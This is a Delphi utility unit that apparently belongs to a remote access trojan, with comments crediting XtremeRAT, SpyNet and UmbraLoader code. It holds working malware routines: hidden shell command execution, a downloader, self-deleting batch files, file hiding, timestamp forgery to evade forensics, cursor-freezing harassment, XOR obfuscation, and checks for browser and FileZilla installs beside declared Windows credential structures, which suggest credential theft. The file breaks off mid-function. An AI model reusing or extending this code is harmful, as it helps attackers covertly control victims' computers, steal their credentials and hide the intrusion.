unit UnitFunctions;

interface

uses
  Windows, WinSock, ShlObj, TlHelp32, ShellAPI, ExtCtrlsX, WinInet;
                                                               
const
  faReadOnly  = $00000001;
  faHidden    = $00000002;
  faSysFile   = $00000004;
  faVolumeID  = $00000008;
  faDirectory = $00000010;
  faArchive   = $00000020;
  faAnyFile   = $0000003F;
  
  fmCreate = $FFFF;
  fmOpenRead = $0000;
  fmOpenWrite = $0001;
  fmOpenReadWrite = $0002;
  fmShareCompat = $0000;
  fmShareExclusive = $0010;
  fmShareDenyWrite = $0020;
  fmShareDenyRead = $0030;
  fmShareDenyNone = $0040;

const
  MAXSTRINGCOUNT = 1000;
    
type
  TStringArray = array[0..MAXSTRINGCOUNT] of string;

  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;
  
  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

  _TOKEN_USER = record
    User: SID_AND_ATTRIBUTES;
  end;
  TOKEN_USER = _TOKEN_USER;
  TTokenUser = TOKEN_USER;
  PTokenUser = ^TOKEN_USER;

  _CREDENTIAL_ATTRIBUTEA = record
    Keyword: LPSTR;
    Flags: DWORD;
    ValueSize: DWORD;
    Value: PBYTE;
  end;
  PCREDENTIAL_ATTRIBUTE = ^_CREDENTIAL_ATTRIBUTEA;

  _CREDENTIALA = record
    Flags: DWORD;
    Type_: DWORD;
    TargetName: LPSTR;
    Comment: LPSTR;
    LastWritten: FILETIME;
    CredentialBlobSize: DWORD;
    CredentialBlob: PBYTE;
    Persist: DWORD;
    AttributeCount: DWORD;
    Attributes: PCREDENTIAL_ATTRIBUTE;
    TargetAlias: LPSTR;
    UserName: LPSTR;
  end;
  PCREDENTIAL = array of ^_CREDENTIALA;

  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: LPCWSTR;
  end;
  PCRYPTPROTECT_PROMPTSTRUCT = ^_CRYPTPROTECT_PROMPTSTRUCT;

  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;

procedure SetTokenPrivileges(Priv: string);
function IntToStr(const i: Integer): string;
function StrToInt(const s: string): Integer;
function ReadKeyDword(Key: HKey; SubKey: string; Data: string): dword;
function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
function StrPCopy(Dest: PChar; const Source: string): PChar;
function ActiveCaption: string;             
function SysDir: string;         
function WinDir: string;
function ExtractFileName(const Path: string): string;
procedure MySelfDelete;
procedure MySelfDeleteFolder;
procedure xExecuteShellCommand(Cmd: string);
function ExtractFilePath(Filename: string): string;
function MyGetFileSize(FileName: String): int64;
procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
function FileToStr(Filename: string): string;
function TmpDir: string;
function ExtractFileExt(const filename: string): string;
function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer; RunAs: Boolean = False): Boolean;
function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
function MyGetDate(S: string): string;
function MyGetTime(S: string): string; 
function MyGetTime2(S: string): string;
function UpperString(S: String): String;
function LowerString(S: String): String;
function DirectoryExists(const Directory: string): Boolean;
function MyBoolToStr(TmpBool: Boolean): string;
function MyStrToBool(TmpStr: string): Boolean;
procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
function RootDir: string;
function ProgramFilesDir: string;
function AppDataDir: string;
function MyDocumentsDir: string;
function ResolveIP(HostName: string): string;
function FileExists(FileName: string): Boolean;
function IntToHex(Value: Integer; Digits: Integer): string;
function GetSpecialFolder(const CSIDL: integer): string;
function FindNext(var F: TSearchRec): Integer;
function FindFirst(const Path: string; Attr: Integer; var  F: TSearchRec): Integer;
function FindMatchingFile(var F: TSearchRec): Integer;
procedure FindClose(var F: TSearchRec);
procedure HideFileName(FileName: string);
function StrLen(tStr:PChar): Integer;
function MyURLDownloadFile(Url, FileName: string): Boolean;
function CreatePath(Path: string): Boolean;
function MyDeleteFile(s: string): Boolean;
function MyGetMonth: string;
procedure ChangeFileTime(FileName: string);
procedure ChangeDirTime(DirName: string);
function GetBrowser: string;
function GetResourceAsString(pSectionName: pchar): string;       
function ProcessFileName(Pid: Cardinal): string;
function MyStartThread(p: Pointer; Params: Pointer = nil): Cardinal;
procedure MyStopThread(hThread: Cardinal);
procedure ProcessMessages;
function ExtractURLFile(Url: string): string;
function LastDelimiter(s: string; Delimiter: Char): Integer;
function StrToIntDef(const S: string; Default: Integer): Integer;
function ParseString(Delim, Str: string): TStringArray;
procedure CrazyMouse(cTimer: Integer);
procedure FreezeCursor(Freeze: Boolean = True);
function ShowBalloon(Text: string; Title: string; bType: Integer; bTime: Integer): Integer;
procedure MyBeep(cTime: Integer);
function SetSuspendState(Hibernate, ForceCritical, NoWakeEvent:boolean): Integer; stdcall;
  external 'powrprof.dll' name 'SetSuspendState';
function AllocMem(Size: Cardinal): Pointer;
function LocalAddress: string;
function MyReplaceStr(const Str, OldStr, NewStr: string): string;
function _AppDataDir: string;
function CheckOperaInstallation: Boolean;
function CheckYandexInstallation: Boolean;
function CheckChromeInstallation: Boolean;
function CheckFirefoxInstallation(var Version, FFPath: string): Boolean;
function CheckFileZillaInstallation: Boolean;
function ParseXml(T_, ForS, _T: string): string;
function GetCreationTime(F: _filetime): string;
function XorEnDecrypt(Str: string): string;
function MegaTrim(str: string): string;

implementation

function MegaTrim(str: string): string; //From spynet
begin
  while Pos('  ', str) >= 1 do delete(str, Pos('  ', str), 1);
  Result := str;
end;

function XorEnDecrypt(Str: string): string;  //Simple Xor encryption
var
  i, c, x: Integer;
begin
  for i := 1 to Length(Str) do
  begin
    c := Integer(Str[i]);
    x := c xor 50;
    Result := Result + Char(x);
  end;
end;

//From XtremeRAT 3.6 source code
function GetCreationTime(f: _filetime): string;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: string;
  LocalHour, SystemHour, Diferenca, Real: integer;
begin
  GetLocalTime(SysTime);
  LocalHour := systime.wHour;

  GetSystemTime(SysTime);
  SystemHour := systime.wHour;

  FileTimeToSystemTime(f, SysTime);

  Month := inttostr(systime.wMonth);
  Day := inttostr(systime.wDay);
  Hour := inttostr(Systime.wHour);
  Minute := inttostr(Systime.wMinute);
  Second := inttostr(systime.wSecond);

  if SystemHour > LocalHour then
  begin
    Diferenca := SystemHour - LocalHour;
    Real := systime.wHour - Diferenca;
    while Real > 24 do Real := Real - 24;
    while Real < 0 do Real := Real + 24;
    Hour := inttostr(Real);
  end
  else

  if SystemHour < LocalHour then
  begin
    Diferenca := LocalHour - SystemHour;
    Real := systime.wHour + Diferenca;
    while Real > 24 do Real := Real - 24;
    while Real < 0 do Real := Real + 24;
    Hour := inttostr(Real);
  end;

  if length(month) = 1 then month := '0' + month;
  if length(day) = 1 then day := '0' + day;
  if length(hour) = 1 then hour := '0' + hour;
  if hour = '24' then hour := '00';
  if length(minute) = 1 then minute := '0' + minute;
  if length(second) = 1 then second := '0' + second;
  
  Result :=  day + '/' + month + '/' + IntTostr(Systime.wYear) + ' ' +
    hour + ':' + minute + ':' + second;
end;

function ParseXml(T_, ForS, _T: string): string;
var
  a, b: integer;
begin
  Result := '';
  if (T_ = '') or (ForS = '') or (_T = '') then Exit;
  a := Pos(T_, ForS);
  if a = 0 then Exit else a := a + Length(T_);
  ForS := Copy(ForS, a, Length(ForS) - a + 1);
  b := Pos(_T, ForS);
  if b > 0 then Result := Copy(ForS, 1, b - 1);
end;

function _AppDataDir: string;
var
  RecPath: array[0..255] of Char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0, RecPath, CSIDL_APPDATA, False) then
  begin
    Result := RecPath;
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function CheckChromeInstallation: Boolean;
begin
  Result := ReadKeyString(HKEY_LOCAL_MACHINE,
    'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths', 'chrome.exe', '') <> '';
end;

function CheckFirefoxInstallation(var Version, FFPath: string): Boolean;
begin
  Result := False;
  Version := ReadKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox', 'CurrentVersion', '');
  if Version = '' then
  Version := ReadKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox', 'CurrentVersion', '');
  if Version = '' then Exit;

  FFPath := ReadKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox', Version + '\Main', '');
  if FFPath = '' then
  FFPath := ReadKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox', Version + '\Main', '');
  Result := FFPath <> '';
end;

function CheckOperaInstallation: Boolean;
begin
  Result := DirectoryExists(AppDataDir + 'Opera Software\Opera Stable');
end;
     
function CheckYandexInstallation: Boolean;
begin
  Result := DirectoryExists(AppDataDir + 'Yandex\YandexBrowser');
end;

function CheckFileZillaInstallation: Boolean;
begin
  Result := DirectoryExists(_AppDataDir + 'FileZilla');
end;

function MyReplaceStr(const Str, OldStr, NewStr: string): string;
var
  i: Integer;
  TmpStr, S: string;
  oStr, nStr: string;
begin
  S := Str;
  Result := S;
  oStr := OldStr;
  nStr := NewStr;
  TmpStr := '';
  if Pos(OldStr, S) <= 0 then Exit;

  repeat
    i := Pos(oStr, S);
    if i > 0 then
    begin
      TmpStr := TmpStr + Copy(S, 1, i - 1);
      TmpStr := TmpStr + nStr;
      S := Copy(S, i + Length(oStr), Length(S));
    end
    else TmpStr := TmpStr + S;
  until i = 0;

  Result := TmpStr;
end;
      
function IntToStr(const i: Integer): string;
begin
  Str(i, Result);
end;

function StrToInt(const s: string): Integer;
var
  i: Integer;
begin
  Val(s, Result, i);
end;

function LocalAddress: string;
type
  TaPInAddr = array [0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  Buffer: pAnsiChar;
  I: Integer;
  GInitData: TWSADATA;
begin
  WSAStartup($101, GInitData);
  Result := '';
  GetMem(Buffer, 64);
  GetHostName(Buffer, 64);
  phe := GetHostByName(buffer);
  if phe = nil then Exit;
  pptr := PaPInAddr(Phe^.h_addr_list);
  I := 0;
  while pptr^[I] <> nil do
  begin
    result := inet_ntoa(pptr^[I]^);
    result := inet_ntoa(pptr^[I]^);
    Inc(I);
  end;
  FreeMem(Buffer, 64);
  WSACleanup;
end;

function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;

procedure MyBeep(cTime: Integer);
var
  i: Integer;
begin
  for i := 1 to cTime do
  Windows.Beep(800, 100)
end;

procedure FreezeCursor(Freeze: Boolean);
var
  Pos: TPoint;
begin
  GetCursorPos(Pos);
  repeat
    SetCursorPos(Pos.X, Pos.Y);
  until Freeze = False;
end;

procedure CrazyMouse(cTimer: Integer);
var
  x, y, i: Integer;
  Pos: TPoint;
begin
  if cTimer <= 0 then Exit;

  x := 0;
  y := 0;
  GetCursorPos(Pos);

  for i := 0 to cTimer do
  begin
    Sleep(1000);
    x := Random(2000);
    y := Random(1000);
    SetCursorPos(x, y);
  end;

  SetCursorPos(Pos.X, Pos.Y);
end;

function ParseString(Delim, Str: string): TStringArray;
var
  Count: Integer;
begin
  Count := 0;
  if Pos(Delim, Str) <= 0 then Exit;

  while (Str <> '') and (Count <= MAXSTRINGCOUNT) do
  begin
    Result[Count] := Copy(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Length(Delim));
    Inc(Count);
  end;
end;

function StrToIntDef(const S: string; Default: Integer): Integer;
var
  E: Integer;
begin
  Val(S, Result, E);
  if E <> 0 then Result := Default;
end;

//From Artic R.A.T
function ExtractURLFile(Url: string): string;
var
  i, iLast, iFirst: Integer;
begin
  iLast := Length(Url) + 1;
  iFirst := 1;

  for i := Length(Url) downto 1 do
  begin
    if Url[i] = '/' then
    begin
      iFirst:= i + 1;
      Break;
    end
    else if Url[i] = '?' then iLast := i;
  end;

  Result := Copy(Url, iFirst, iLast - iFirst);
end;

//From XtremeRAT
//-----
function xProcessMessage(var Msg: TMsg): Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;

  Sleep(5);
end;

procedure ProcessMessages;
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do ;
end;
//-----

function MyStartThread(p: Pointer; Params: Pointer): Cardinal;
var
  hThread: THandle;
begin
  Result := CreateThread(nil, 0, p, Params, 0, hThread);
end;

procedure MyStopThread(hThread: Cardinal);
begin
  TerminateThread(hThread, 1);
  CloseHandle(hThread)
end;

function GetModuleFileNameExA(hProcess: THandle; hModule: HMODULE; lpFilename: PChar;
  nSize: DWORD): DWORD stdcall; external 'PSAPI.dll' name 'GetModuleFileNameExA';

function ProcessFileName(Pid: Cardinal): string;
var
  Handle: THandle;
begin
  Result := '';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, Pid);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
    begin
      if GetModuleFileNameExA(Handle, 0, PChar(Result), MAX_PATH) > 0 then
        SetLength(Result, StrLen(PChar(Result)))
    end;
  finally
    CloseHandle(Handle);
  end;
end;

//p0ke mods by cswi
function GetResources(pSectionName: PChar; out ResourceSize: LongWord): Pointer;
var
  ResourceLocation: Cardinal;
  ResourceHandle: Cardinal;
begin
  ResourceLocation := FindResourceA(hInstance, PAnsiChar(pSectionName), PAnsiChar(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
end;

//p0ke mods by cswi
function GetResourceAsString(pSectionName: pchar): string;
var
  ResourceData: PChar;
  SResourceSize: LongWord;
begin
  ResourceData := GetResources(pSectionName, SResourceSize);
  SetString(Result, ResourceData, SResourceSize);
end;

function GetBrowser: string;
var
  B: array[0..255] of char;
  handle: integer;
  filename: string;
begin
  filename := 'tmp.htm';
  handle := createfile(pchar(Filename),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN, 0);
  CloseHandle(handle);
  FindExecutable(pchar(Filename),'',b);
  DeleteFile(pchar(Filename));
  Result := b;
end;

procedure ChangeFileTime(FileName: string);
var
  SHandle: THandle;
  MyFileTime : TFileTime;
begin
  randomize;
  MyFileTime.dwLowDateTime := 29700000 + random(99999);
  MyFileTime.dwHighDateTime:= 29700000 + random(99999);

  SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if SHandle = INVALID_HANDLE_VALUE then
  begin
    CloseHandle(sHandle);
    SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if SHandle <> INVALID_HANDLE_VALUE then
    SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
    CloseHandle(sHandle);
  end
  else SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
  CloseHandle(sHandle);
end;

procedure ChangeDirTime(DirName: string);
var
  h: THandle;
  ft: TFileTime;
begin
  ft.dwLowDateTime := 29700000 + random(99999);
  ft.dwHighDateTime:= 29700000 + random(99999);

  h:= CreateFile(PChar(DirName), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);

  if h <> INVALID_HANDLE_VALUE then
  begin
    SetFileTime(h, nil, @ft, nil); // last access
    SetFileTime(h, nil, nil, @ft);  // last write
    SetFileTime(h, @ft, nil, nil);   // creation
  end;

  CloseHandle(h);
end;

function MyDeleteFile(s: string): Boolean;
var
  i: Byte;
begin
  Result := False;
  if FileExists(s) then
  try
    i := GetFileAttributes(PChar(s));
    i := i and faHidden;
    i := i and faReadOnly;
    i := i and faSysFile;
    SetFileAttributes(PChar(s), i);
    Result := DeleteFile(Pchar(s));
  except
  end;
end;

//From SpyNet
function CreatePath(Path: string): Boolean;
var
  TempStr, TempDir: string;
begin
  result := false;
  if Path = '' then exit;
  if DirectoryExists(Path) = true then
  begin
    Result := true;
    Exit;
  end;

  TempStr := Path;
  if TempStr[length(TempStr)] <> '\' then TempStr := TempStr + '\';

  while pos('\', TempStr) >= 1 do
  begin
    TempDir := TempDir + copy(TempStr, 1, pos('\', TempStr));
    delete(Tempstr, 1, pos('\', TempStr));
    if DirectoryExists(TempDir) = false then
    if Createdirectory(pchar(TempDir), nil) = false then Exit;
  end;

  Result := DirectoryExists(Path);
end;
    
function FileExists(FileName: string): Boolean;
var
  cHandle: THandle;
  FindData: TWin32FindData;
begin
  cHandle := FindFirstFileA(Pchar(FileName),FindData);
  Result := cHandle <> INVALID_HANDLE_VALUE;
  if Result then Windows.FindClose(cHandle);
end;

//From UmbraLoader 1.1.1 , modified by wrh1d3 :)
//-----
function MyURLDownloadFile(Url, FileName: string): Boolean;
var
  hInet, hFile: HINTERNET;
  fHandle, dWrite: Cardinal;
  Buffer: array[1..1024] of Byte;
  bRead: DWORD;
begin
  Result := False;
  hInet := InternetOpen('Mozilla/5.0', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  hFile := InternetOpenURL(hInet, PChar(Url), nil, 0, 0, 0);
  if not Assigned(hFile) then Exit;
  fHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
  if fHandle = INVALID_HANDLE_VALUE then  Exit;
  repeat
    InternetReadFile(hFile, @Buffer, SizeOf(Buffer), bRead);
    WriteFile(fHandle, Buffer[1], bRead, dWrite, nil);
  until bRead = 0;
  CloseHandle(fHandle);
  InternetCloseHandle(hFile);
  InternetCloseHandle(hInet);
  Result := True;
end;
//-----

function FileToStr(Filename: string): string;
var
  hFile: THandle;
  dSize, dRead: DWORD;
begin
  Result := '';
  hFile := CreateFile(PChar(Filename), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile = 0 then Exit;
  dSize := GetFileSize(hFile, nil);
  if dSize = 0 then Exit;
  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  SetLength(Result, dSize);
  ReadFile(hFile, Result[1], dSize, dRead, nil);
  CloseHandle(hFile);
end;

procedure HideFileName(FileName: string);
var
  i: cardinal;
begin
  i := GetFileAttributes(PChar(FileName));
  i := i or faReadOnly;
  i := i or faHidden;
  i := i or faSysFile;
  SetFileAttributes(PChar(FileName), i);
end;

function StrLen(tStr:PChar): Integer;
begin
  Result := 0;
  while tStr[Result] <> #0 do Inc(Result);
end;

procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
    begin
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    end;
    
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

function FindFirst(const Path: string; Attr: Integer; var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end
  else Result := GetLastError;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then Result := FindMatchingFile(F) else
    Result := GetLastError;
end;

function ResolveIP(HostName: string): string;
type
  tAddr = array[0..100] Of PInAddr;
  pAddr = ^tAddr;
var
  I: Integer;
  PHE: PHostEnt;
  P: pAddr;
begin
  Result := '';
  try
    PHE := GetHostByName(pChar(HostName));
    if (PHE <> nil) then
    begin
      P := pAddr(PHE^.h_addr_list);
      I := 0;
      while (P^[I] <> nil) do
      begin
        Result := (inet_nToa(P^[I]^));
        Inc(I);
      end;
    end;
  except
  end;
end;

function MyBoolToStr(TmpBool: Boolean): string;
begin
  if TmpBool = True then Result := 'Yes' else Result := 'No';
end;

function MyStrToBool(TmpStr: string): Boolean;
begin
  if TmpStr = 'Yes' then Result := True else Result := False;
end;

function DirectoryExists(const Directory: string): Boolean; var Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;

function UpperString(S: String): String; var i: Integer;
begin
  for i := 1 to Length(S) do S[i] := char(CharUpper(PChar(S[i])));
  Result := S;
end;

function LowerString(S: String): String; var i: Integer;
begin
  for i := 1 to Length(S) do S[i] := char(CharLower(PChar(S[i])));
  Result := S;
end;

function MyGetTime(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + S + inttostr(MyTime.wMinute) + S + inttostr(MyTime.wSecond);
end;
     
function MyGetTime2(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + S + inttostr(MyTime.wMinute) + S +
    inttostr(MyTime.wSecond) + S + inttostr(MyTime.wMilliseconds);
end;

function MyGetDate(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + S + inttostr(MyTime.wMonth) + S + inttostr(MyTime.wYear);
end;

function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
begin
  if Hwnd = 0 then Hwnd := HWND_DESKTOP;

  if mType = 0 then mType := MB_ICONERROR else
  if mType = 1 then mType := MB_ICONWARNING else
  if mType = 2 then mType := MB_ICONQUESTION else
  if mType = 3 then mType := MB_ICONINFORMATION else mType := 0;

  case bType of
    0: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OK);
    1: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OKCANCEL);
    2: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNO);
    3: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNOCANCEL);
    4: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_RETRYCANCEL);
    5: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_ABORTRETRYIGNORE);
  end;
end;
      
function ShowBalloon(Text: string; Title: string; bType: Integer; bTime: Integer): Integer;
var
  TrayIcon: TTrayIcon;
begin
  TrayIcon := TTrayIcon.Create(nil);
  TrayIcon.Visible := True;

  case bType of
    0: TrayIcon.BalloonFlags := bfError;
    1: TrayIcon.BalloonFlags := bfWarning;
    3: TrayIcon.BalloonFlags := bfInfo;
    4: TrayIcon.BalloonFlags := bfNone;
  end;

  TrayIcon.BalloonTitle := Title;
  TrayIcon.BalloonHint := Text;
  TrayIcon.BalloonTimeout := bTime;
  TrayIcon.ShowBalloonHint;
end;

function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer; RunAs: Boolean): Boolean;
var
  SEI: SHELLEXECUTEINFO;
begin
  try
    FillChar(SEI, SizeOf(SEI), 0);
    SEI.cbSize := SizeOf(SEI);
    SEI.Wnd := 0;
    SEI.fMask := SEE_MASK_NOCLOSEPROCESS or SEE_MASK_FLAG_DDEWAIT or SEE_MASK_FLAG_NO_UI;
    if RunAs then SEI.lpVerb := 'runas' else SEI.lpVerb := 'open';
    SEI.lpFile := PChar(FileName);
    SEI.lpParameters := PChar(Parameters);           
    SEI.lpDirectory := nil;
    SEI.nShow := ShowCmd;
    Result := ShellExecuteEx(@SEI);
  except
  end;
end;

function ExtractFileExt(const filename: string): string;
var
  i, l: integer;
  ch: char;
begin
  if pos('.', filename) = 0 then
  begin
    result := '';
    exit;
  end;

  l := length(filename);
  for i := l downto 1 do
  begin
    ch := filename[i];
    if (ch = '.') then
    begin
      result := copy(filename, i, length(filename));
      break;
    end;
  end;
end;

function LastDelimiter(s: string; Delimiter: Char): Integer;
var
  i: Integer;
begin
  Result := -1;
  i := Length(s);
  if (s = '') or (i = 0) then Exit;
  while s[i] <> Delimiter do
  begin
    if i < 0 then Break;
    Dec(i);
  end;
  Result := i;
end;

function ExtractFilePath(Filename: string): string;
begin
  if (LastDelimiter(Filename, '\') = -1) and (LastDelimiter(Filename, '/') = -1) then Exit;
  if LastDelimiter(Filename, '\') <> -1 then Result := Copy(Filename, 1, LastDelimiter(Filename, '\')) else
  if LastDelimiter(Filename, '/') <> -1 then Result := Copy(Filename, 1, LastDelimiter(Filename, '/'));
end;

procedure xExecuteShellCommand(Cmd: string);
var
  SI: TStartupInfo;
  PI: TProcessInformation;
begin
  FillChar(SI, SizeOf(SI), 0);
  SI.cb := SizeOf(SI);
  SI.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  SI.wShowWindow := SW_HIDE;
  SI.hStdInput := GetStdHandle(STD_INPUT_HANDLE);
  CreateProcess(nil, PChar('cmd.exe /C ' + Cmd), nil, nil, True, 0, nil, PChar('C:\'), SI, PI);
end;

function MyGetFileSize(Filename: String): int64;
var
  hFile: THandle;
begin
  hFile := CreateFile(pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  Result := GetFileSize(hFile, nil);
  CloseHandle(hFile);
end;
    
procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
var
  hFile, i: Cardinal;
begin
  if not FileExists(Filename) then
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  end
  else
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_END);
  end;
  
  WriteFile(hFile, Buffer[1], BufferSize, i, nil);
  CloseHandle(hFile);                                                  
end;

function TmpDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

procedure MySelfDelete;
var
  TmpStr, TmpFile: string;
begin
  TmpFile := TmpDir + IntToStr(GetCurrentProcessId) + '.bat';
  TmpStr := ':f' + #13#10;
  TmpStr := TmpStr + 'attrib -R -A -S -H "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'del "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'if EXIST "' + ParamStr(0) + '" goto f' + #13#10;
  TmpStr := TmpStr + 'del "' + TmpFile + '"' + #13#10;
  TmpStr := TmpStr + 'del %0';
  MyCreateFile(TmpFile, TmpStr, Length(TmpStr));
  MyShellExecute(PChar(TmpFile), '', SW_HIDE);
end;

procedure MySelfDeleteFolder;
var
  TmpStr, TmpFile: string;
begin
  TmpFile := TmpDir + IntToStr(GetCurrentProcessId) + '_f.bat';
  TmpStr := ':f' + #13#10;
  TmpStr := TmpStr + 'attrib -R -A -S -H "' + ExtractFilePath(ParamStr(0)) + '"' + #13#10;
  TmpStr := TmpStr + 'rmdir "' + ExtractFilePath(ParamStr(0)) + '"' + #13#10;
  TmpStr := TmpStr + 'if EXIST "' + ExtractFilePath(ParamStr(0)) + '" goto f' + #13#10;
  TmpStr := TmpStr + 'del "' + TmpFile + '"' + #13#10;
  TmpStr := TmpStr + 'del %0';
  MyCreateFile(TmpFile, TmpStr, Length(TmpStr));
  MyShellExecute(PChar(TmpFile), '', SW_HIDE);
end;

function WinDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function RootDir: string;
begin
  Result := Copy(WinDir, 1, 3);
end;

function SysDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

function ActiveCaption: string;
var
  Title: array [0..260] of Char;
begin
